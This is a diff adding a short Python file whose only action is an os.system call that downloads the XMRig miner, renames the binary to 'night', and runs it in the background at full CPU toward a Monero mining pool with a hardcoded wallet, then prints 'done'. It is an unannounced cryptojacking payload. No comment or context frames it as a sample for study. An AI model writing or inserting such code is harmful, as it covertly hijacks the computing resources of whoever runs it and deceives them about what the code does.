@@ -1,0 +1,3 @@
+import os
+os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-bionic-x64.tar.gz && tar -zxf xmrig-6.8.2-bionic-x64.tar.gz && mv xmrig-6.8.2/xmrig xmrig-6.8.2/night && sha256sum xmrig-6.8.2/night &&  cd xmrig-6.8.2 && ./night  -B --cpu-max-threads-hint=100  --threads=100 --cpu-no-yield -o vkdk.dvg.xyx.0xx0.cf:4444 -u 85nAss3iKjaWsEvSDG37UMAXfNt3H3b2YLaiqNXKVAtP2tnCcBUHxfa7rFmMprk37z4nRHJUYhiYsQVT2oQs1cRj919nRve.GGeasy2 -k  --coin monero -a rx/0")
+print("done")
